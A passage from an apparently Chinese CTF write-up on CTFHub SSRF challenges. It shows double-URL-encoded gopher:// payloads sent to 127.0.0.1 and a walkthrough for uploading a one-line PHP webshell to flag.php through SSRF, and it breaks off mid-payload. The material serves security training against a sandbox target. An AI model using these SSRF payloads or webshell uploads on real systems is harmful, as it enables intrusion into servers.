class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>得到flag</p><p>这种题每一步骤都要按标准严格执行，错一点都不行，可以说是细节决定成败，大家要注意审查</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949387.png"></p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>很显然是SSRF结合文件上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949630.png"></p><p>还是尝试访问flag.php</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">5</span>c15690adbc22656.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://<span class="hljs-number">127.0.0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>是一个上传框</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949528.png"></p><p>发现没有提交键，那我们修改一下html</p><p>打开F12开发者工具，右击要修改的HTML，点击编辑HTML</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949172.png"></p><p>加上这一行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950849.png"></p><p>我们准备一个一句话木马，选择一句话木马，提交</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952844.png"></p><p>和之前一样，重定向了，并且说“只需从 127.0.0.1 查看”</p><p>结合题目，应该还是需要我们用gopher协议去用post方法文件上传到flag.php，不过需要注意的是要从127.0.0.1发送数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950480.png"></p><p>那就构造gopher提交数据，去文件上传。</p><p>我们再按之前的做法试一遍，只不过这次是为了抓包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950322.png"></p><p>去掉无效数据，注意按下面的格式来，不要去掉已有的换行符</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950614.png"></p><p>还是两次URL编码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950929.png"></p><p>……</p><p>最后是这样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950991.png"></p><p>然后我们构造gopher</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span 